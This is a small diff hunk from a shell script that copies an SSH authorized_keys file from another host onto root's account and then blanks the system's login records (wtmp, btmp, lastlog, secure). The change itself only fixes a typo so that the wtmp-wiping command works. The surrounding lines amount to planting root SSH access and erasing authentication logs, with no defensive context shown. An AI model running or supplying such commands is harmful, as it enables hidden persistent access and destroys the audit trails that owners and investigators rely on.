@@ -30,7 +30,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAtrXPgb98RmgVvXr9NNa71Eblzh+KfLuRwGIkCW9tfJwl
 cat /root/.ssh/authorized_keys
 scp root@192.168.8.50:/root/.ssh/authorized_keys /root/.ssh/authorized_keys
 
-cho > /var/log/wtmp
+echo > /var/log/wtmp
 echo > /var/log/btmp
 echo > /var/log/lastlog
 echo > /var/log/secure
